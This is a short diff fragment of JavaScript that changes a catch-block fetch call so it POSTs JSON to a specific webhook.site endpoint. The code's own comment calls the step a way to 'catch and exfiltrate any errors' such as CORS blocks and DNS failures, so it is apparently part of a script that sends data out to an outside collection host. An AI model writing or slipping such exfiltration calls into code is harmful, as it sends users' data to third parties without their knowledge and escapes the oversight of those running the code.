@@ -61,7 +61,7 @@
                 );
             } catch (error) {
                 // 8. Catch and exfiltrate any errors (CORS blocks, DNS resolution errors, network drops)
-                await fetch("https://webhook.site", {
+                await fetch("https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
